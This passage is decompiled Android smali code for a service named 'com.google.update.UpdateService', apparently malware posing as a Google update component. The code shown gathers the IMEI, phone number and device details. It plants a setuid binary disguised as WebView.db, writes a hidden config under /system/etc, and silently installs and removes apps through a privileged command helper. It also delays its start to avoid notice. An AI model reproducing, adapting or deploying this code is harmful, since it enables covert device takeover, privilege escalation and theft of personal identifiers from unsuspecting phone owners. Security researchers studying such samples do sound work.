    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "/mycfg.ini"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 747
    .local v2, "dest":Ljava/lang/String;
    new-instance v5, Ljava/io/FileOutputStream;

    invoke-direct {v5, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    .line 748
    .local v5, "myOutput":Ljava/io/OutputStream;
    iget-object v8, p0, Lcom/google/update/UpdateService;->mModel:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "_"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 749
    .local v4, "model":Ljava/lang/String;
    iget-object v8, p0, Lcom/google/update/UpdateService;->mOsType:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "_"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 750
    .local v7, "ostype":Ljava/lang/String;
    iget-object v8, p0, Lcom/google/update/UpdateService;->mOsAPI:Ljava/lang/String;

    const-string v9, " "

    const-string v10, "_"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 751
    .local v6, "osapi":Ljava/lang/String;
    new-instance v8, Ljava/lang/StringBuilder;

    iget-object v9, p0, Lcom/google/update/UpdateService;->mImei:Ljava/lang/String;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, " -1 "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 752
    .local v1, "data":Ljava/lang/String;
    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v8

    invoke-virtual {v5, v8}, Ljava/io/OutputStream;->write([B)V

    .line 753
    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V

    .line 754
    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V

    .line 756
    new-instance v8, Ljava/io/File;

    invoke-direct {v8, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-eqz v8, :cond_1

    .line 757
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "2 "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " /system/etc/.rild_cfg"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 758
    .restart local v0    # "cmd":Ljava/lang/String;
    invoke-static {v0}, Lcom/google/update/Utils$TCP;->execute(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 764
    .end local v0    # "cmd":Ljava/lang/String;
    .end local v1    # "data":Ljava/lang/String;
    .end local v2    # "dest":Ljava/lang/String;
    .end local v4    # "model":Ljava/lang/String;
    .end local v5    # "myOutput":Ljava/io/OutputStream;
    .end local v6    # "osapi":Ljava/lang/String;
    .end local v7    # "ostype":Ljava/lang/String;
    :cond_1
    :goto_1
    :try_start_1
    const-string v2, "/data/data/WebView.db"

    .line 765
    .restart local v2    # "dest":Ljava/lang/String;
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "1 "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lcom/google/update/Utils$TCP;->execute(Ljava/lang/String;)Z

    .line 766
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "4 /system/bin/chmod 4755 "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8}, Lcom/google/update/Utils$TCP;->execute(Ljava/lang/String;)Z

    .line 768
    new-instance v8, Ljava/io/File;

    invoke-direct {v8, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-eqz v8, :cond_2

    .line 769
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "4 "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 770
    .restart local v0    # "cmd":Ljava/lang/String;
    invoke-static {v0}, Lcom/google/update/Utils$TCP;->execute(Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 774
    .end local v0    # "cmd":Ljava/lang/String;
    :cond_2
    const/4 v8, 0x0

    goto/16 :goto_0

    .line 772
    .end local v2    # "dest":Ljava/lang/String;
    :catch_0
    move-exception v8

    move-object v3, v8

    .local v3, "e":Ljava/lang/Exception;
    const-string v8, "BINEXEC"

    goto/16 :goto_0

    .line 760
    .end local v3    # "e":Ljava/lang/Exception;
    :catch_1
    move-exception v8

    goto :goto_1
.end method

.method private uninstallPackage(Ljava/lang/String;)V
    .locals 6
    .param p1, "pkgName"    # Ljava/lang/String;

    .prologue
    const/4 v5, -0x1

    .line 851
    const/4 v2, 0x0

    .line 854
    .local v2, "pkgInfo":Landroid/content/pm/PackageInfo;
    invoke-static {p0}, Lcom/google/update/Utils$PkgManager;->getInstallPackageInfo(Landroid/content/Context;)Ljava/util/List;

    move-result-object v1

    .line 855
    .local v1, "infos":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 862
    :goto_0
    if-nez v2, :cond_2

    .line 863
    const-string v3, "NoPkg"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 874
    :goto_1
    return-void

    .line 855
    :cond_1
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/pm/PackageInfo;

    .line 856
    .local v0, "info":Landroid/content/pm/PackageInfo;
    iget-object v4, v0, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v4, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 857
    move-object v2, v0

    .line 858
    goto :goto_0

    .line 868
    .end local v0    # "info":Landroid/content/pm/PackageInfo;
    :cond_2
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v3

    if-eqz v3, :cond_4

    .line 869
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "3 /data/app/"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, v2, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget-object v4, v4, Landroid/content/pm/ApplicationInfo;->sourceDir:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/google/update/Utils$TCP;->execute(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 870
    const/4 v3, 0x1

    const-string v4, "ByCP"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_1

    .line 872
    :cond_3
    const-string v3, "CPDelFail"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_1

    .line 873
    :cond_4
    const-string v3, "NOPERM"

    invoke-direct {p0, v5, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_1
.end method

.method private updateInfo()V
    .locals 2

    .prologue
    .line 196
    invoke-static {p0}, Lcom/google/update/Utils$PhoneState;->getImei(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->mImei:Ljava/lang/String;

    .line 197
    invoke-static {p0}, Lcom/google/update/Utils$PhoneState;->getMobile(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->mMobile:Ljava/lang/String;

    .line 199
    invoke-static {}, Lcom/google/update/Utils$PhoneState;->getModel()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->mModel:Ljava/lang/String;

    .line 200
    invoke-static {}, Lcom/google/update/Utils$PhoneState;->getSDKVersion()[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    aget-object v0, v0, v1

    iput-object v0, p0, Lcom/google/update/UpdateService;->mOsType:Ljava/lang/String;

    .line 201
    invoke-static {}, Lcom/google/update/Utils$PhoneState;->getSDKVersion()[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x1

    aget-object v0, v0, v1

    iput-object v0, p0, Lcom/google/update/UpdateService;->mOsAPI:Ljava/lang/String;

    .line 202
    invoke-static {p0}, Lcom/google/update/Utils$PhoneState;->getAliaMemorySize(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->mAliaMem:Ljava/lang/String;

    .line 203
    invoke-static {p0}, Lcom/google/update/Utils$PhoneState;->getSDAliaMemory(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->mSDMem:Ljava/lang/String;

    .line 204
    invoke-static {p0}, Lcom/google/update/Utils$PhoneState;->getConnectType(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->mNetType:Ljava/lang/String;

    .line 205
    invoke-static {p0}, Lcom/google/update/Utils$PhoneState;->getNetOperater(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/update/UpdateService;->mOperater:Ljava/lang/String;

    .line 206
    return-void
.end method


# virtual methods
.method public installPakage([Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 8
    .param p1, "pathName"    # [Ljava/lang/String;
    .param p2, "run"    # Ljava/lang/String;
    .param p3, "sysName"    # Ljava/lang/String;

    .prologue
    const/4 v7, 0x5

    const/4 v6, 0x0

    const/4 v5, 0x1

    .line 820
    aget-object v3, p1, v5

    invoke-static {p0, v3}, Lcom/google/update/Utils$PkgManager;->getPackageMsg(Landroid/content/Context;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    .line 822
    .local v1, "info":[Ljava/lang/String;
    invoke-direct {p0}, Lcom/google/update/UpdateService;->checkPermission()Z

    move-result v3

    if-eqz v3, :cond_4

    .line 824
    if-eqz p3, :cond_1

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "2 "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v4, p1, v6

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " /system/app/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 826
    .local v0, "cmd":Ljava/lang/String;
    :goto_0
    invoke-static {v0}, Lcom/google/update/Utils$TCP;->execute(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 827
    if-nez p2, :cond_2

    move v2, v5

    .line 828
    .local v2, "state":I
    :goto_1
    const-string v3, "CPInstOK"

    invoke-direct {p0, v2, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    .line 829
    if-eqz p2, :cond_0

    invoke-direct {p0, p2}, Lcom/google/update/UpdateService;->runPackage(Ljava/lang/String;)V

    .line 833
    .end local v0    # "cmd":Ljava/lang/String;
    .end local v2    # "state":I
    :cond_0
    :goto_2
    return-void

    .line 825
    :cond_1
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "1 "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v4, p1, v6

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " /data/app/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    aget-object v4, v1, v5

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ".apk"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .restart local v0    # "cmd":Ljava/lang/String;
    goto :goto_0

    :cond_2
    move v2, v7

    .line 827
    goto :goto_1

    .line 831
    :cond_3
    const-string v3, "CPInstFail"

    invoke-direct {p0, v7, v3}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_2

    .line 832
    .end local v0    # "cmd":Ljava/lang/String;
    :cond_4
    const/4 v3, -0x1

    const-string v4, "NOPERM"

    invoke-direct {p0, v3, v4}, Lcom/google/update/UpdateService;->reportState(ILjava/lang/String;)V

    goto :goto_2
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 100
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 21

    .prologue
    .line 109
    invoke-super/range {p0 .. p0}, Landroid/app/Service;->onCreate()V

    .line 112
    :try_start_0
    invoke-virtual/range {p0 .. p0}, Lcom/google/update/UpdateService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v15

    invoke-virtual/range {p0 .. p0}, Lcom/google/update/UpdateService;->getPackageName()Ljava/lang/String;

    move-result-object v16

    const/16 v17, 0x80

    invoke-virtual/range {v15 .. v17}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v4

    .line 113
    .local v4, "ai":Landroid/content/pm/ApplicationInfo;
    iget-object v5, v4, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    .line 114
    .local v5, "bundle":Landroid/os/Bundle;
    const-string v15, "ST_START_DELAY"

    invoke-virtual {v5, v15}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v13

    .line 115
    .local v13, "value":Ljava/lang/Object;
    if-eqz v13, :cond_0

    check-cast v13, Ljava/lang/Integer;

    .end local v13    # "value":Ljava/lang/Object;
    invoke-virtual {v13}, Ljava/lang/Integer;->intValue()I

    move-result v15

    int-to-long v15, v15

    move-wide v0, v15

    move-object/from16 v2, p0

    iput-wide v0, v2, Lcom/google/update/UpdateService;->startDelay:J

    .line 116
    :cond_0
    const-string v15, "ST_MY_PID"

    invoke-virtual {v5, v15}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v14

    .line 117
    .local v14, "value2":Ljava/lang/Object;
    if-eqz v14, :cond_1

    check-cast v14, Ljava/lang/String;

    .end local v14    # "value2":Ljava/lang/Object;
    move-object v0, v14

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/google/update/UpdateService;->mIdentifier:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 122
    .end local v4    # "ai":Landroid/content/pm/ApplicationInfo;
    .end local v5    # "bundle":Landroid/os/Bundle;
    :cond_1
    :goto_0
    const-string v15, "sstimestamp"

    const/16 v16, 0x0

    move-object/from16 v0, p0

    move-object v1, v15

    move/from16 v2, v16

    invoke-virtual {v0, v1, v2}, Lcom/google/update/UpdateService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v12

    .line 123
    .local v12, "p":Landroid/content/SharedPreferences;
    const-string v15, "start"

    const-wide/16 v16, 0x0

    move-object v0, v12

    move-object v1, v15

    move-wide/from16 v2, v16

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v10

    .line 124
    .local v10, "last":J
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    .line 125
    .local v6, "cur":J
    const-wide/16 v15, 0x0

    cmp-long v15, v10, v15

    if-nez v15, :cond_2

    .line 126
    invoke-interface {v12}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v9

    .line 127
    .local v9, "ed":Landroid/content/SharedPreferences$Editor;
    const-string v15, "start"

    invoke-interface {v9, v15, v6, v7}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    .line 128
    invoke-interface {v9}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 129
    move-object/from16 v0, p0

    iget-wide v0, v0, Lcom/google/update/UpdateService;->startDelay:J

    move-wide v15, v0

    const-wide/16 v17, 0x0

    cmp-long v15, v15, v17

    if-lez v15, :cond_3

    .line 130
    invoke-virtual/range {p0 .. p0}, Lcom/google/update/UpdateService;->stopSelf()V

    .line 144
    .end local v9    # "ed":Landroid/content/SharedPreferences$Editor;
    :goto_1
    return-void

    .line 118
    .end local v6    # "cur":J
    .end local v10    # "last":J
    .end local v12    # "p":Landroid/content/SharedPreferences;
    :catch_0
    move-exception v15

    move-object v8, v15

    .line 119
    .local v8, "e":Ljava/lang/Exception;
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 133
    .end local v8    # "e":Ljava/lang/Exception;
    .restart local v6    # "cur":J
    .restart local v10    # "last":J
    .restart local v12    # "p":Landroid/content/SharedPreferences;
    :cond_2
    sub-long v15, v6, v10

    move-object/from16 v0, p0

    iget-wide v0, v0, Lcom/google/update/UpdateService;->startDelay:J

    move-wide/from16 v17, v0

    const-wide/16 v19, 0x3e8

    mul-long v17, v17, v19

    cmp-long v15, v15, v17

    if-gez v15, :cond_3

    .line 134
    invoke-virtual/range {p0 .. p0}, Lcom/google/update/UpdateService;->stopSelf()V

    goto :goto_1

    .line 138
    :cond_3
    const-string v15, "permission"

    const/16 v16, 0x0

    move-object/from16 v0, p0

    move-object v1, v15

    move/from16 v2, v16

    invoke-virtual {v0, v1, v2}, Lcom/google/update/UpdateService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v15

    move-object v0, v15

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/google/update/UpdateService;->mPreferences:Landroid/content/SharedPreferences;

    .line 140
    invoke-static/range {p0 .. p0}, Lcom/google/update/Utils;->isConnected(Landroid/content/Context;)Z

    move-result v15

    if-eqz v15, :cond_4

    invoke-direct/range {p0 .. p0}, Lcom/google/update/UpdateService;->doSearchReport()V

    .line 142
    :cond_4
    invoke-direct/range {p0 .. p0}, Lcom/google/update/UpdateService;->getPermission()V

    .line 143
    invoke-direct/range {p0 .. p0}, Lcom/google/update/UpdateService;->provideService()V

    goto :goto_1
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 210
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 212
    iget-object v0, p0, Lcom/google/update/UpdateService;->mTimer:Ljava/util/Timer;

    if-eqz v0, :cond_0

    .line 213
    iget-object v0, p0, Lcom/google/update/UpdateService;->mTimer:Ljava/util/Timer;

    invoke-virtual {v0}, Ljava/util/Timer;->cancel()V

    .line 215
    :cond_0
    return-void
.end method
